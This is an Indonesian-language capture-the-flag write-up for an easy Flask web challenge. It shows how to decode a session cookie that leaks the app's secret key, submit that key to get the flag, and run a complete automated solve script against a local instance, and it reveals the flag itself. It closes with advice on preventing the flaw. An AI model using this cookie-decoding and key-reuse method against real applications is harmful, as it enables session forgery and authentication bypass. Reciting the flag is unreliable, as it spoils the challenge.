# Flask Session Challenge - Panduan Solusi

## Ringkasan Challenge

**Nama Challenge:** Secret Vault  
**Kategori:** Web Exploitation  
**Tingkat Kesulitan:** Mudah  
**Flag:** `UbigCTF{Keyvano_Ganteng_kwokwokw_canda}`

## Penjelasan Vulnerability

### Apa itu kerentanan ini?

Challenge ini mengeksploitasi kesalahan konfigurasi yang umum terjadi di aplikasi web Flask: **penanganan session yang tidak aman**.

**Konsep kunci:**
- Session Flask disimpan sebagai **cookie** di browser pengguna
- Cookie ini **ditandatangani** (untuk mencegah manipulasi) tetapi **TIDAK dienkripsi**
- Siapa pun dapat mendekode dan membaca data session
- Aplikasi menyimpan `app.secret_key` secara langsung di dalam session

### Mengapa ini menjadi masalah?

Aplikasi melakukan ini:
```python
session['sk'] = app.secret_key
```

Ini berarti secret key dikirim ke client (kamu!) dalam format yang dapat dibaca. Kamu dapat mendekodenya dan menggunakannya untuk mendapatkan flag.

---

## Langkah-Langkah Solusi

### Langkah 1: Akses Challenge

1. Buka browser dan kunjungi URL challenge
2. Klik "Enter Vault" atau langsung ke `/flag`

### Langkah 2: Temukan Session Cookie

1. Buka **Browser Developer Tools** (Tekan `F12`)
2. Pergi ke tab **Application** (Chrome) atau tab **Storage** (Firefox)
3. Navigasi ke **Cookies** → URL challenge
4. Temukan cookie bernama `session`
5. Salin nilainya (akan berupa string base64 yang panjang)

**Contoh cookie:**
```
eyJzayI6eyIgYiI6IkMwTGNsY25QTVN...
```

### Langkah 3: Decode Session Cookie

Cookie session Flask menggunakan struktur berikut:
```
base64(payload).base64(timestamp).signature
```

**Metode 1: Menggunakan flask-unsign (Disarankan)**

Install tools:
```bash
pip install flask-unsign
```

Decode session:
```bash
flask-unsign --decode --cookie "YOUR_SESSION_COOKIE_HERE"
```

**Contoh output:**
```json
{'sk': {'b': 'C0LclcnPMSlHu5zaytHf6SiHu...'}}
```

**Metode 2: Menggunakan Python**

```python
import base64
import json

cookie = "eyJzayI6eyIgYiI6IkMwTGNsY25QTVN..."
# Ambil hanya bagian payload (sebelum titik pertama)
payload = cookie.split('.')[0]
# Tambahkan padding jika diperlukan
payload += '=' * (4 - len(payload) % 4)
# Decode
decoded = base64.urlsafe_b64decode(payload)
print(json.loads(decoded))
```

**Metode 3: Online Decoder**

Gunakan tools online seperti:
- https://www.kirsle.net/wizards/flask-session.cgi
- https://jwt.io (ubah algorithm menjadi none)

### Langkah 4: Ekstrak Secret Key

Dari session yang telah didecode, kamu akan melihat:
```json
{
  "sk": {
    " b": "BASE64_ENCODED_SECRET_KEY"
  }
}
```

Nilai dari `" b"` (perhatikan spasi sebelum 'b') adalah **secret key yang diencode base64**.

Salin nilai ini.

### Langkah 5: Submit Secret Key

Kunjungi endpoint flag dengan secret key sebagai parameter:
```
/flag?sk=YOUR_BASE64_SECRET_KEY
```

**Contoh:**
```
/flag?sk=C0LclcnPMSlHu5zaytHf6SiHu...
```

### Langkah 6: Dapatkan Flag! 🎉

Jika secret key benar, kamu akan melihat:
```
🎉 Congratulations!
UbigCTF{Keyvano_Ganteng_kwokwokw_canda}
```

---

## Script Python Lengkap untuk Solusi

Berikut adalah solusi otomatis lengkap:

```python
import requests
from flask_unsign import session as flask_session

# Langkah 1: Kunjungi /flag untuk mendapatkan session cookie
url = "http://127.0.0.1:5000/flag"
response = requests.get(url)

# Langkah 2: Ekstrak session cookie
session_cookie = response.cookies.get('session')
print(f"[+] Session Cookie: {session_cookie}")

# Langkah 3: Decode session
decoded_session = flask_session.verify(session_cookie, secret='', legacy=False)
print(f"[+] Decoded Session: {decoded_session}")

# Langkah 4: Ekstrak secret key
secret_key = decoded_session['sk']
print(f"[+] Secret Key: {secret_key}")

# Langkah 5: Submit secret key
import base64
secret_key_b64 = base64.b64encode(secret_key).decode('utf-8')
flag_url = f"{url}?sk={secret_key_b64}"
flag_response = requests.get(flag_url)

# Langkah 6: Ekstrak flag dari response
if "UbigCTF" in flag_response.text:
    print("[+] FLAG DITEMUKAN!")
    # Parse HTML untuk ekstrak flag
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(flag_response.text, 'html.parser')
    print(soup.get_text())
```

---

## Poin Pembelajaran

### Apa yang kita pelajari?

1. **Session Flask tidak dienkripsi** - Hanya ditandatangani dengan HMAC-SHA256
2. **Jangan pernah menyimpan data sensitif di session** - Meskipun ditandatangani, data tetap bisa dibaca
3. **Secret key tidak boleh diekspos** - Setelah attacker mendapatkan secret key, mereka dapat memalsukan session

### Bagaimana cara mencegahnya?

**Praktik buruk:**
```python
session['sk'] = app.secret_key  # Jangan pernah lakukan ini!
```

**Praktik baik:**
```python
# Simpan hanya identifier yang tidak sensitif
session['user_id'] = user.id

# Simpan secret di sisi server
# Bandingkan secret di memori, bukan di session
if submitted_secret == os.environ.get('APP_SECRET'):
    return flag
```

### Dampak di dunia nyata

Jenis kerentanan ini dapat menyebabkan:
- Pemalsuan session (Session forgery)
- Bypass autentikasi (Authentication bypass)
- Eskalasi privilege (Privilege escalation)
- Pengungkapan informasi (Information disclosure)

---

## Sumber Tambahan

- [Dokumentasi Flask Session](https://flask.palletsprojects.com/en/2.3.x/quickstart/#sessions)
- [OWASP - Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [flask-unsign GitHub](https://github.com/Paradoxis/Flask-Unsign)

---

**Pembuat Challenge:** Keyvano  
**Tingkat Kesulitan:** Mudah  
**Kategori:** Web Exploitation  
**Tags:** Flask, Session, Cookie, Web Security
